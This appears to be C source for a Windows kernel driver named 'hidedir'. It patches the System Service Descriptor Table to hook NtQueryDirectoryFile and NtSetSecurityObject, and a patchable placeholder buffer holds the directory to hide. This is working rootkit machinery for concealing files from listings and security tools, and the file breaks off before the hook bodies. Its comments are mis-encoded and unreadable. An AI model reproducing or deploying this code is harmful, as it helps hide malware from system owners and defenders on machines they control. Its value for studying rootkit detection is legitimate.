// TODO ���һ����ʱ�� ��ʱִ�� 

#include <ntifs.h>
#include <ntimage.h>
#include <windef.h>


#pragma warning(disable: 4054 4055) 

extern ULONG * InitSafeBootMode;

#ifdef DBG
#define dbg_msg(Format, ...) DbgPrint("[hidedir]%d-%s:" Format "\n",__LINE__,__FUNCTION__, __VA_ARGS__)
#define dbg_brk() {__asm int 3}
#else
#define dbg_msg
#define dbg_brk
#endif

#define AV_MEM_TAG 'AvTg'
#define ObjectNameInformation 1
#pragma pack(push,1)

typedef struct _GLOBAL
{
    ULONG* pSSDTBase;
    ULONG ulSSDTNum;
    PVOID hNtoskrnl;
    ULONG uNtoskrnlSize;
}GLOBAL;

typedef struct _NATIVE_ENTRY
{
    UCHAR mov;	//0x8B
    ULONG NativeIndex;
}NATIVE_ENTRY;

#pragma pack(pop)

typedef struct _KSERVICE_TABLE_DESCRIPTOR
{
    PULONG_PTR	ServiceTableBase;
    PULONG		ServiceCounterTableBase;
    ULONG		NumberOfServices;
    PUCHAR		ParamTableBase;
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;

typedef struct _MODULE_NODE
{
    /* 0x00 */   ULONG Section;
    /* 0x04 */   PVOID MappedBase;
    /* 0x08 */   PVOID ImageBase;
    /* 0x0C */   ULONG ImageSize;
    /* 0x10 */   ULONG Flags;
    /* 0x14 */   USHORT LoadOrderIndex;
    /* 0x18 */   USHORT InitOrderIndex;
    /* 0x1C */   USHORT LoadCount;
    /* 0x00 */   USHORT OffsetToFileName;
    CHAR FullPathName[256];
}SYSTEM_MODULE_NODE;

typedef struct _SYSTEM_MODULES_INFO
{
    ULONG NumberOfModules;
    SYSTEM_MODULE_NODE Modules[1];
}SYSTEM_MODULES_INFO;


typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation, /// Obsolete: Use KUSER_SHARED_DATA
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation,
    SystemLocksInformation,
    SystemStackTraceInformation,
    SystemPagedPoolInformation,
    SystemNonPagedPoolInformation,
    SystemHandleInformation,
    SystemObjectInformation,
    SystemPageFileInformation,
    SystemVdmInstemulInformation,
    SystemVdmBopInformation,
    SystemFileCacheInformation,
    SystemPoolTagInformation,
    SystemInterruptInformation,
    SystemDpcBehaviorInformation,
    SystemFullMemoryInformation,
    SystemLoadGdiDriverInformation,
    SystemUnloadGdiDriverInformation,
    SystemTimeAdjustmentInformation,
    SystemSummaryMemoryInformation,
    SystemMirrorMemoryInformation,
    SystemPerformanceTraceInformation,
    SystemObsolete0,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemKernelDebuggerInformation,
    SystemContextSwitchInformation,
    SystemRegistryQuotaInformation,
    SystemLoadAndCallImage,
    SystemPrioritySeperation,
    SystemPlugPlayBusInformation,
    SystemDockInformation,
    SystemPowerInformationNative,
    SystemProcessorSpeedInformation,
    SystemCurrentTimeZoneInformation,
    SystemLookasideInformation,
    SystemTimeSlipNotification,
    SystemSessionCreate,
    SystemSessionDetach,
    SystemSessionInformation,
    SystemRangeStartInformation,
    SystemVerifierInformation,
    SystemAddVerifier,
    SystemSessionProcessesInformation,
    SystemLoadGdiDriverInSystemSpaceInformation,
    SystemNumaProcessorMap,
    SystemPrefetcherInformation,
    SystemExtendedProcessInformation,
    SystemRecommendedSharedDataAlignment,
    SystemComPlusPackage,
    SystemNumaAvailableMemory,
    SystemProcessorPowerInformation,
    SystemEmulationBasicInformation,
    SystemEmulationProcessorInformation,
    SystemExtendedHandleInformation,
    SystemLostDelayedWriteInformation,
    SystemBigPoolInformation,
    SystemSessionPoolTagInformation,
    SystemSessionMappedViewInformation,
    SystemHotpatchInformation,
    SystemObjectSecurityMode,
    SystemWatchDogTimerHandler,
    SystemWatchDogTimerInformation,
    SystemLogicalProcessorInformation,
    SystemWo64SharedInformationObosolete,
    SystemRegisterFirmwareTableInformationHandler,
    SystemFirmwareTableInformation,
    SystemModuleInformationEx,
    SystemVerifierTriageInformation,
    SystemSuperfetchInformation,
    SystemMemoryListInformation,
    SystemFileCacheInformationEx,
    SystemThreadPriorityClientIdInformation,
    SystemProcessorIdleCycleTimeInformation,
    SystemVerifierCancellationInformation,
    SystemProcessorPowerInformationEx,
    SystemRefTraceInformation,
    SystemSpecialPoolInformation,
    SystemProcessIdInformation,
    SystemErrorPortInformation,
    SystemBootEnvironmentInformation,
    SystemHypervisorInformation,
    SystemVerifierInformationEx,
    SystemTimeZoneInformation,
    SystemImageFileExecutionOptionsInformation,
    SystemCoverageInformation,
    SystemPrefetchPathInformation,
    SystemVerifierFaultsInformation,
    MaxSystemInfoClass,
} SYSTEM_INFORMATION_CLASS;
//////////////////////////////////////////////////////////////////////////
/*
���溯���ҹ���Ϣ�Ľṹ��
*/
typedef struct _HOOK_CONTEXT
{
    WCHAR *ApiName;  //����������
    void *Orig_func; // ����ԭ���ĵ�ַ
    void *Real_func; // HOOK ��ĵ��õ�ַ
    void *Hook_func; // HOOK �����ĵ�ַ  
}HOOK_CONTEXT;

typedef NTSTATUS (* P_NtQueryDirectoryFile)(IN HANDLE FileHandle,
                                            IN HANDLE EventHandle OPTIONAL,
                                            IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
                                            IN PVOID ApcContext OPTIONAL,
                                            OUT PIO_STATUS_BLOCK IoStatusBlock,
                                            OUT PVOID FileInformation,
                                            IN ULONG Length,
                                            IN FILE_INFORMATION_CLASS FileInformationClass,
                                            IN BOOLEAN ReturnSingleEntry,
                                            IN PUNICODE_STRING FileName OPTIONAL,
                                            IN BOOLEAN RestartScan);

typedef NTSTATUS (* P_NtSetSecurityObject)(IN HANDLE Handle,
                    IN SECURITY_INFORMATION SecurityInformation,
                    IN PSECURITY_DESCRIPTOR SecurityDescriptor);

extern NTSTATUS NTAPI ZwQuerySystemInformation( 
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    OUT PVOID SystemInformation, 
    IN SIZE_T Length, 
    OUT PSIZE_T ResultLength );

extern PVOID RtlImageDirectoryEntryToData( 
    PVOID BaseAddress, 
    BOOLEAN MappedAsImage, 
    USHORT Directory, 
    PULONG Size );

NTSTATUS HOOK_NtQueryDirectoryFile(IN HANDLE FileHandle,
                                   IN HANDLE EventHandle OPTIONAL,
                                   IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
                                   IN PVOID ApcContext OPTIONAL,
                                   OUT PIO_STATUS_BLOCK IoStatusBlock,
                                   OUT PVOID FileInformation,
                                   IN ULONG Length,
                                   IN FILE_INFORMATION_CLASS FileInformationClass,
                                   IN BOOLEAN ReturnSingleEntry,
                                   IN PUNICODE_STRING FileName OPTIONAL,
                                   IN BOOLEAN RestartScan);

NTSTATUS  HOOK_NtSetSecurityObject(IN HANDLE Handle,
                    IN SECURITY_INFORMATION SecurityInformation,
                    IN PSECURITY_DESCRIPTOR SecurityDescriptor);

void clean_backslash(WCHAR  *str);

GLOBAL g_global = {0};
HOOK_CONTEXT g_hook_table[] = {
    {L"ZwCreateFile",NULL,NULL,(LPVOID)NULL}, // 0
    {L"ZwWriteFile",NULL,NULL,(LPVOID)NULL}, //1
    {L"NtQueryDirectoryFile",NULL,NULL,(void *)HOOK_NtQueryDirectoryFile}, //3
	{L"NtSetSecurityObject",NULL,NULL,(void *)HOOK_NtSetSecurityObject}, //4
};

WCHAR g_HideDir[512] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

enum _XXXXXXXXXXXXXX
{
    I_ZwCreateFile = 0x0,
    I_ZwWriteFile = 0x1,
    I_NtQueryDirectoryFile,
	I_NtSetSecurityObject,
};

/*
�Ƿ��ǰ�ȫģʽ
@return ����������ڰ�ȫģʽ�� �򷵻� TRUE ���򷵻� FALSE
*/
BOOLEAN  IsSafeBootMode()
{
    if (*InitSafeBootMode > 0)
    {
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

//����һ��ϵͳģ���б���ڴ�
SYSTEM_MODULES_INFO* __cdecl av_AllocSysModuleInfo()
{
    SYSTEM_MODULES_INFO* vpBuff=NULL;
    ULONG vulBuffSize=0;
    NTSTATUS vStatus=STATUS_UNSUCCESSFUL;

    ZwQuerySystemInformation(SystemModuleInformation,&vulBuffSize,0,&vulBuffSize);
    vpBuff = (SYSTEM_MODULES_INFO*) ExAllocatePoolWithTag(PagedPool,vulBuffSize,AV_MEM_TAG);
    if (NULL != vpBuff)
    {
        vStatus = ZwQuerySystemInformation(SystemModuleInformation,vpBuff,vulBuffSize,NULL);
        if (!NT_SUCCESS(vStatus))
        {
            ExFreePoolWithTag(vpBuff,AV_MEM_TAG);
            vpBuff = NULL;
        }
    }
    if(NULL == vpBuff)
    {
        dbg_msg("alloc system module info failed !!\n");
    }
    return vpBuff;
}

//�ͷ�ϵͳģ���б���ڴ�
VOID __stdcall av_FreeSysModuleInfo(PVOID pMem)
{
    if (NULL != pMem)
    {
        ExFreePoolWithTag(pMem,0);
    }
}

/*
���ļ�·���еõ��ļ���
*/
WCHAR *av_GetFileNameFromPathNameW(WCHAR *Path)
{
    WCHAR *fileName = NULL;
    fileName = wcsrchr(Path,L'\\');
    if(fileName)
        fileName++;
    else
        fileName = Path;
    if(*fileName == 0)
        fileName = NULL;
    return fileName;
}


CHAR *av_GetFileNameFromPathName(CHAR *Path)
{
    CHAR *fileName;
    fileName = strrchr(Path,'\\');
    if(fileName)
        fileName++;
    else
        fileName = Path;
    if(*fileName == 0)
        fileName = NULL;
    return fileName;
}


//����ָ����ģ��,�ҵ��Ժ��ģ����Ϣͨ���ڶ�����������һ��
BOOL av_FindModule(char* pszModuleName, SYSTEM_MODULE_NODE* pModuleNode)
{	
    SYSTEM_MODULE_NODE* vpSysModuleNode=NULL;
    BOOL bFlag=FALSE;
    SYSTEM_MODULES_INFO* vpSysModuleInfo=NULL;
    ULONG ulIndex=0;

    vpSysModuleInfo = av_AllocSysModuleInfo();
    if (vpSysModuleInfo)
    {
        vpSysModuleNode = vpSysModuleInfo->Modules;
        for (ulIndex=0; ulIndex < vpSysModuleInfo->NumberOfModules; ulIndex++)
        {
            CHAR *fileName = av_GetFileNameFromPathName(vpSysModuleNode[ulIndex].FullPathName);
            if (0 == _stricmp(fileName,pszModuleName) )
            {
                memcpy( pModuleNode,&vpSysModuleNode[ulIndex],sizeof(SYSTEM_MODULE_NODE) );
                bFlag = TRUE;
                break;
            }
        }
        av_FreeSysModuleInfo(vpSysModuleInfo);
    }

    return bFlag;
}

//ר�ŷ���Ntoskrnl��ģ����Ϣ,
BOOLEAN av_GetNtoskrnl_ModuleNode(SYSTEM_MODULE_NODE* pModuleNode)
{
    BOOLEAN vbFlag=FALSE;
    SYSTEM_MODULES_INFO* vpSysModuleInfo=NULL;

    if (NULL != pModuleNode)
    {
        vpSysModuleInfo = av_AllocSysModuleInfo();
        if (NULL != vpSysModuleInfo)
        {
            memcpy(pModuleNode,vpSysModuleInfo->Modules,sizeof(SYSTEM_MODULE_NODE));
            av_FreeSysModuleInfo(vpSysModuleInfo);
            vbFlag = TRUE;
        }
    }
    if(!vbFlag)
    {
        dbg_msg("Get kernel base failed !!");
    }
    return vbFlag;
}

/*
��ȡ����������ַ
@hModule ģ�����ڴ��еĻ�ַ 
@pszProcName ��Ҫ��ȡ�ĺ���������
@return �ɹ����غ����ĵ�ַ ʧ�ܷ��� NULL
*/
PVOID __stdcall av_GetProcAddr(PVOID hModule, char* pszProcName)
{
    PCHAR DllBase;
    USHORT OrdinalNumber;
    PULONG NameTableBase;
    PUSHORT NameOrdinalTableBase;
    PULONG Addr;
    ULONG High;
    ULONG Low;
    ULONG Middle = 0;
    LONG Result;
    ULONG ExportSize;
    PVOID FunctionAddress;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory;

    PAGED_CODE();

    DllBase = hModule;

    ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)RtlImageDirectoryEntryToData(
        DllBase,
        TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT,
        &ExportSize
        );

    ASSERT (ExportDirectory != NULL);


    NameTableBase = (PULONG)(DllBase + (ULONG)ExportDirectory->AddressOfNames);



    NameOrdinalTableBase = (PUSHORT)(DllBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);


    Low = 0;
    High = ExportDirectory->NumberOfNames - 1;

    while (High >= Low) {


        Middle = (Low + High) >> 1;

        Result = strcmp(pszProcName,
            (PCHAR)(DllBase + NameTableBase[Middle]));

        if (Result < 0) {
            High = Middle - 1;
        }
        else if (Result > 0) {
            Low = Middle + 1;
        }
        else {
            break;
        }
    }

    if (High < Low) {
        return NULL;
    }

    OrdinalNumber = NameOrdinalTableBase[Middle];



    if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions) {
        return NULL;
    }


    Addr = (PULONG)(DllBase + (ULONG)ExportDirectory->AddressOfFunctions);

    FunctionAddress = (PVOID)(DllBase + Addr[OrdinalNumber]);


    ASSERT ((FunctionAddress <= (PVOID)ExportDirectory) ||
        (FunctionAddress >= (PVOID)((PCHAR)ExportDirectory + ExportSize)));

    return FunctionAddress;
}


/*
��ntdll����ntoskrnl�ĵ������ȡSSDT������
@hModule ģ��Ļ�ַ
@pszNativeName ��Ҫ��ȡ����������
@return ������SSDT���еı�� 
*/
int av_GetSSDTIndexFromNtoskrnlOrNtdll(HANDLE hModule, char *pszNativeName)
{
    NATIVE_ENTRY stNativeEntry={0};
    PVOID pFunAddr=NULL;
    int NativeIndex = -1;

    if (NULL != hModule)
    {
        if (NULL != pszNativeName)
        {
            pFunAddr = av_GetProcAddr(hModule,pszNativeName);
            if (NULL != pFunAddr)
            {
                memcpy(&stNativeEntry,pFunAddr,sizeof(NATIVE_ENTRY));
                NativeIndex = stNativeEntry.NativeIndex;
            }
        }
    }

    return NativeIndex;
}


/*
* Char����ݷ�������ȡSSDT����
@pszNativeName ����������
@return ������ SSDT ���е����
*/
int av_GetSSDTIndexA(char *pszNativeName)
{
    BOOL bFlag=FALSE;
    int ulNativeIndex = -1;
    SYSTEM_MODULE_NODE stModuleNode;
    bFlag = av_FindModule("ntdll.dll",&stModuleNode);
    if (!bFlag)
    {
        bFlag = av_GetNtoskrnl_ModuleNode(&stModuleNode);
    }

    if (bFlag)
    {
        ulNativeIndex = av_GetSSDTIndexFromNtoskrnlOrNtdll(stModuleNode.ImageBase,pszNativeName);
    }

    return ulNativeIndex;
}

/*
av_GetSSDTIndexA  ������ unicode �汾
*/
int av_GetSSDTIndexW(WCHAR *pszNativeName)
{
    UNICODE_STRING usName = {0};
    ANSI_STRING asName = {0};
    int ulNativeIndex = -1 ;

    if (NULL != pszNativeName)
    {
        RtlInitUnicodeString(&usName,pszNativeName);
        if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&asName,&usName,TRUE)) )
        {
            ulNativeIndex = av_GetSSDTIndexA(asName.Buffer);
            RtlFreeAnsiString(&asName);
        }
    }

    return ulNativeIndex;
}


/*
��ȡһ����ַ�Ŀ�д��ַ,�����´������ڴ�������
@pAddr ��Ҫд����ڴ��ַ
@ulSize �ڴ�Ĵ�С
@ppWriteableAddr  ���ڷ����ڴ��д��ַ��ָ��
@return �ɹ����ض�Ӧ���ڴ������� ʧ�ܷ��� NULL
*/
PMDL av_GetAddrWriteableAddr(PVOID pAddr, ULONG ulSize, PVOID *ppWriteableAddr)
{
    PMDL pNewMDL=NULL;
    BOOLEAN bNeedClean=FALSE;
    PVOID vpNewWriteableAddr=NULL;

    __try
    {
        pNewMDL = IoAllocateMdl(pAddr,ulSize,FALSE,TRUE,NULL);
        if (NULL != pNewMDL)
        {
            MmProbeAndLockPages(pNewMDL,KernelMode,IoWriteAccess);
            if (pNewMDL->MdlFlags & 5)//MDL_SOURCE_IS_NONPAGED_POOL
            {
                vpNewWriteableAddr = pNewMDL->MappedSystemVa;
            }
            else
            {
                //����ҳ�浽�ڴ�
                vpNewWriteableAddr = MmMapLockedPagesSpecifyCache(pNewMDL,KernelMode,MmCached,NULL,0,NormalPagePriority);
            }
            if (NULL == vpNewWriteableAddr)
            {
                MmUnlockPages(pNewMDL);
                bNeedClean = TRUE;
            }
            if (NULL != ppWriteableAddr)
            {
                *ppWriteableAddr = vpNewWriteableAddr;
            }
            if (bNeedClean)
            {
                IoFreeMdl(pNewMDL);
                pNewMDL = NULL;
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        dbg_msg("oh no, \n");
    }
    return pNewMDL;
}

/*
�ͷ��ڴ�������,��av_GetAddrWriteableAddr���ʹ�õ�
@Mdl �ڴ�������

@return �޷���ֵ
*/
VOID  av_EndSafeWrite(PMDL Mdl)
{
    if (NULL != Mdl)
    {
        MmUnlockPages(Mdl);
        IoFreeMdl(Mdl);
    }
}


//��һ����������,�ڶ������µķ����ַ,��������ԭʼ�����ַ,���ر�Hook������  ʧ���� ���� -1 
int  av_SSDTHookByIndexEx(ULONG ulNativeIndex, PVOID pfnNewNative, PVOID *ppfnOriginalNative)
{
    ULONG* pulWriteableSSDTBase = NULL;
    PMDL pNewMDL=NULL;
    int ulReturn = -1;

    if (ulNativeIndex != -1)
    {
        if (NULL != pfnNewNative)
        {
            if (NULL != ppfnOriginalNative)
            {
                *ppfnOriginalNative = NULL;
                if (NULL != g_global.pSSDTBase)
                {
                    pNewMDL = av_GetAddrWriteableAddr(g_global.pSSDTBase,
                        g_global.ulSSDTNum * sizeof(ULONG),
                        (PVOID*)&pulWriteableSSDTBase);

                    if (NULL != pNewMDL)
                    {
                        //����ԭ��ַ
                        *ppfnOriginalNative = (PVOID)g_global.pSSDTBase[ulNativeIndex];

                        InterlockedExchange((volatile LONG *)&pulWriteableSSDTBase[ulNativeIndex],(ULONG)pfnNewNative);
                        //pulWriteableSSDTBase[ulNativeIndex] = (ULONG)pfnNewNative;

                        ulReturn = ulNativeIndex;
                        av_EndSafeWrite(pNewMDL);
                    }
                }
            }
        }
    }

    return ulReturn;
}

BOOLEAN av_InitGloabl()
{
    KSERVICE_TABLE_DESCRIPTOR* pKeServiceDescriptorTable=NULL;
    SYSTEM_MODULE_NODE sNtsoKrnl;
    if (av_GetNtoskrnl_ModuleNode(&sNtsoKrnl))
    {
        g_global.hNtoskrnl = sNtsoKrnl.ImageBase;
        g_global.uNtoskrnlSize = sNtsoKrnl.ImageSize;
    }
    else
    {
        return FALSE;
    }
    pKeServiceDescriptorTable = (KSERVICE_TABLE_DESCRIPTOR*)av_GetProcAddr(sNtsoKrnl.ImageBase,"KeServiceDescriptorTable");
    if (NULL != pKeServiceDescriptorTable)
    {
        if (MmIsAddressValid(pKeServiceDescriptorTable))
        {
            g_global.pSSDTBase = pKeServiceDescriptorTable->ServiceTableBase;
            g_global.ulSSDTNum = pKeServiceDescriptorTable->NumberOfServices;
            return TRUE;
        }
    }
    return FALSE;
}


int av_InitHookTable()
{
    int count = 0;
    int i = 0 ;
    for ( i = 0; i < sizeof(g_hook_table)/sizeof(HOOK_CONTEXT); i++)
    {
        if(g_hook_table[i].ApiName && g_hook_table[i].Hook_func)
        {
            if(g_hook_table[i].Orig_func == NULL)
            {
                int idx = 0;
                if(-1 != (idx = av_GetSSDTIndexW(g_hook_table[i].ApiName)))
                {
                    KIRQL Irql = KeRaiseIrqlToDpcLevel();//�ر��̵߳���
                    if(-1 != av_SSDTHookByIndexEx(idx,g_hook_table[i].Hook_func,&g_hook_table[i].Orig_func))
                    {
                        g_hook_table[i].Real_func = g_hook_table[i].Orig_func;
                        count ++;
                        dbg_msg("Hook func %S OK !!\n",g_hook_table[i].ApiName);
                    }
                    KeLowerIrql(Irql);
                }
            }
        }
    }
    return count;
}

__inline BOOLEAN av_CheckHookState()
{
    if(UserMode == ExGetPreviousMode())// && TRUE == g_avhook.bStartCapture)
    {
        return TRUE;
    }
    return FALSE;
}

/*
avhook ʹ�õ��ڴ���亯��


@size ��Ҫ�ڴ�Ĵ�С
@retuen �����ڴ�Ļ�ַ
*/
__inline VOID *av_Allocate(ULONG size)
{
    PVOID p = ExAllocatePoolWithTag(NonPagedPool,size,AV_MEM_TAG);
    if(NULL == p)
    {
        dbg_msg("try alloc %u bytes , no memery !!! \n",size);
        //if(KeGetCurrentIrql() < DISPATCH_LEVEL)
        //    ExRaiseStatus(STATUS_NO_MEMORY);
    }
    return p;
}

/*
�ͷ��� av_Allocate ������ڴ�
@p �ڴ�Ļ�ַ
*/
__inline VOID av_Free(VOID *p)
{
    if(NULL == p)
        return;
    ExFreePoolWithTag(p,AV_MEM_TAG);
}


/*
�õ������Ӧ������
@HObject ���
@return �����������Ϣ  ʧ�ܷ��� NULL
*/
OBJECT_NAME_INFORMATION* av_GetObjectNameFromHandle(HANDLE hObject)
{
    ULONG returnedLength; 
    NTSTATUS status;
    OBJECT_NAME_INFORMATION *ni = NULL;  //<-- �Ժ���ָ������� ��ʼ��
    OBJECT_NAME_INFORMATION *ret = NULL;

    PAGED_CODE();

    status = ZwQueryObject(hObject, 
        (OBJECT_INFORMATION_CLASS)ObjectNameInformation,
        ni, 
        0, 
        &returnedLength);
    if(STATUS_INFO_LENGTH_MISMATCH == status)
    {
        int i;
        for (i = 0 ;i< 10;i++)//try 10 times
        {
            returnedLength += 1024;
            ni = (OBJECT_NAME_INFORMATION *)av_Allocate(returnedLength);
            if(!ni)
                break;
            status = ZwQueryObject(hObject,
                (OBJECT_INFORMATION_CLASS)ObjectNameInformation,
                ni,
                returnedLength,
                &returnedLength);
            if(STATUS_SUCCESS == status)
            {
                ret = ni;
                ni = NULL;
                break;
            }
            if(STATUS_INFO_LENGTH_MISMATCH == status)
            {
                av_Free(ni);
                ni = NULL;
            }
            else
                break;
        }
        if(ni)
        {
            //10 �ζ����С���������
            av_Free(ni);
            ni = NULL;
            return NULL; //ֱ�ӷ����ˡ��� 
        }
    }
    else
    {
        //dbg_msg("failed !! return status 0x%08X \n",status);
    }
    return ret;
}

//���ص� WCHAR Ҫ�� av_Free �ͷŵ� 
WCHAR *av_UnicodeStringToWchar(PUNICODE_STRING string)
{
    WCHAR *str = NULL;
    if(string == NULL)
        return str;
    str = (WCHAR *)av_Allocate(string->Length + sizeof(WCHAR));
    wcsncpy(str, string->Buffer, string->Length / 2); 
    str[string->Length / 2] = 0; // wcsncpy �����ں��油��  0
    return str;
}

/*
�� \Device\HarddiskVolume2  ת���� C:\\
--> \Device\HarddiskVolume2
--> \Device\HarddiskVolume4
--> \Device\HarddiskVolume5
--> \Device\HarddiskVolume3
--> \Device\IsoCdRom0
--> \Device\LanmanRedirector\;W:0000000000026107\10.24.10.160\test  <-- ���������� 
*/
LONG Vol2Dos[32]={
    -1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1};

NTSTATUS av_VolumeNameToDosName(WCHAR *volumeName,WCHAR DosName[4])
{
    WCHAR deviceNameBuffer[7] = L"\\??\\ :";
    ULONG i;
    NTSTATUS status = STATUS_NOT_FOUND;
    UNICODE_STRING LinkName;
    LONG HardDiskIndex = -1;
    WCHAR *Pix = L"\\Device\\HarddiskVolume";

    if(wcslen(volumeName) < wcslen(Pix) + 1)
    {
        return status;
    }

    if(_wcsnicmp(volumeName,Pix,wcslen(Pix)) != 0)
    {
        //ֻ֧�ֱ���Ӳ��
        return status;
    }

    HardDiskIndex = volumeName[wcslen(Pix)] - L'0';

    // dbg_msg("get hard disk index %d \n",HardDiskIndex);

    if(-1 == Vol2Dos[HardDiskIndex])
    {
        LinkName.Length = 0;
        LinkName.Buffer = (PWSTR)av_Allocate(64 * sizeof(WCHAR));
        LinkName.MaximumLength = 64 * sizeof(WCHAR);

        for (i = 0; i < 26; i++)
        {
            HANDLE linkHandle;
            OBJECT_ATTRIBUTES oa;
            UNICODE_STRING deviceName;

            deviceNameBuffer[4] = (WCHAR)(L'A' + i);
            deviceName.Buffer = deviceNameBuffer;
            deviceName.Length = 6 * sizeof(WCHAR);

            InitializeObjectAttributes(
                &oa,
                &deviceName,
                OBJ_CASE_INSENSITIVE,
                NULL,
                NULL
                );

            /*
            ���ܻ��������̵ľ����û��ʼ������� ������
            */
            if (NT_SUCCESS(ZwOpenSymbolicLinkObject(
                &linkHandle,
                SYMBOLIC_LINK_QUERY,
                &oa
                )))
            {
                LinkName.Length = 0;
                //LinkName.Buffer = (PWSTR)av_Allocate(64 * sizeof(WCHAR));
                LinkName.MaximumLength = 64 * sizeof(WCHAR);
                if (!NT_SUCCESS(ZwQuerySymbolicLinkObject(
                    linkHandle,
                    &LinkName,
                    NULL
                    )))
                {

                }
                else
                {
                    WCHAR *p = av_UnicodeStringToWchar(&LinkName);
                    if(p)
                    {
                        if(wcsncmp(p,volumeName,wcslen(p)) == 0)
                        {
                            if(HardDiskIndex >= sizeof(Vol2Dos)/sizeof(Vol2Dos[0]))
                            {
                                dbg_msg("buffer overflower !\n");
                                //dbg_brk();
                            }
                            else
                            {
                                //���뻺��
                                Vol2Dos[HardDiskIndex] = i;
                                status = STATUS_SUCCESS;
                            }
                        }
                        av_Free(p);
                    }
                }
                ZwClose(linkHandle);
            }
            else
            {

            }
        }
        av_Free(LinkName.Buffer);
    }
    else
    {
        i = Vol2Dos[HardDiskIndex];
        DosName[0] = L'A' + (WCHAR)i;
        DosName[1] = L':';
        DosName[2] = L'\\';
        DosName[3] = L'\0';
        status = STATUS_SUCCESS;
    }

    return status;
}

/*
�Լ�ʵ�ֵ� wcsdup �汾
@str ������ַ���
@return ���ظ��Ƶ��ַ��� ����ʧ��
*/
__forceinline  WCHAR *av_wcsdup(WCHAR *str)
{
    UINT size = (wcslen(str) + 2) * sizeof(WCHAR);
    WCHAR *out = (WCHAR *)av_Allocate(size);
    if(out)
    {
        memset(out,0,size);
        wcsncpy(out,str,size/sizeof(WCHAR));
    }
    return out;
}

/*
������� �� \Device\HarddiskVolume1\WINDOWS\system32\taskmgr.exe 
ת���� C:\WINDOWS\system32\taskmgr.exe 
���� \Device\HarddiskVolume1 �滻�ɶ�Ӧ���̷�
@VolumePath ������ļ�·��
@return �����µ��ļ�·�� Ҫ�� av_Free �ͷŵ�
*/
WCHAR *av_ConvertVolumePathToDosPath(WCHAR *VolumePath)
{
    WCHAR *DosPath = NULL;
    WCHAR *volume = L"\\Device\\HarddiskVolume";
    //if(wcsncmp(volume,VolumePath,wcslen(volume)) == 0)
    {
        WCHAR *secondSlash = wcsstr(VolumePath,volume);
        if(secondSlash)
        {
            secondSlash += wcslen(volume);
            secondSlash = wcschr(secondSlash,L'\\');
            if(secondSlash)
            {
                WCHAR DosName[4];
                WCHAR volume_name[64];
                memset(volume_name,0,64 * sizeof(WCHAR));
                wcsncpy(volume_name,VolumePath,secondSlash - VolumePath);
                if(STATUS_SUCCESS == av_VolumeNameToDosName(volume_name,DosName))
                {
                    DosPath = av_wcsdup(VolumePath);
                    if(DosPath)
                    {
                        wcscpy(DosPath,DosName);
                        wcscat(DosPath,secondSlash);
                        clean_backslash(DosPath);
                    }
                }
            }
        }
    }
    if(NULL == DosPath)
    {
        //dbg_msg("·������ת������ %S \n",VolumePath);
    }
    return DosPath;
}


/*
���ļ�����õ��ļ��� DOS��·��
@hFile �ļ��ľ��
@return �����ļ���·�� ��Ҫ��av_Free�ͷŵ�
*/
WCHAR *av_GetFileDosPathFromHandle(HANDLE hFile)
{
    WCHAR *ret = NULL;
    OBJECT_NAME_INFORMATION *oi = av_GetObjectNameFromHandle(hFile);
    if(oi)
    {
        UNICODE_STRING *FileName = &oi->Name;
        WCHAR *wFileName = av_UnicodeStringToWchar(FileName);
        if(wFileName)
        {
            WCHAR *DosPath = NULL;
            DosPath = av_ConvertVolumePathToDosPath(wFileName);
            if(DosPath)
            {
                ret = DosPath;
            }
            av_Free(wFileName);
        }   
        av_Free(oi);
    }
    return ret;
}

/*
�ַ������Ӻ��� 
@d Ŀ���ַ���
@s Դ�ַ���
@n Ŀ�������Ա�����ַ������� ����ĩβ�� \0
@return �������Ӻ���ַ���
*/
WCHAR *av_wcsncat(WCHAR *d,WCHAR *s,int n)
{
    int i = 0;
    for(i = wcslen(d);i < n - 1 && *s;i++,s++)
    {
        d[i] = *s;
    }
	d[i] = 0;
    return d;
}

/*
�ַ������ƺ���
@d Ŀ���ڴ�
@s Դ�ַ���
@n Ŀ���ڴ��п��Դ�ŵ�����ַ����� ����ĩβ�� \0
@return ���� d
*/
WCHAR *av_wcsncpy(WCHAR *d,WCHAR *s,int n)
{
    int i = 0;
    for(i = 0;i < n - 1 && *s;i++,s++)
    {
        d[i] = *s;
    }
	d[i] = 0;
    return d;
}

/*
���ַ����еĵ�һ�� \\ ��Ϊ  \
@str ������ַ��� �ڴ�Ҫ��д
@int �ɹ����� 1 ʧ�ܷ��� 0
*/
int clean_backslash2(WCHAR  *str)
{
    WCHAR *p;
    while(*str)
    {
        if(*str == '\\' && *(str+1) == '\\')
        {
            p = ++str;
            while(*str)
            {
                *p++ = *(str+1);
                ++str;
            }
            return 1;
        }
        ++str;
    }
    return 0;
}

/*
��һ���ַ��������е� \\ ���\
@str ������ַ���
*/
void clean_backslash(WCHAR  *str)
{
    while(clean_backslash2(str));
}


BOOLEAN av_IsFileNameInHideList(WCHAR *fileName)
{
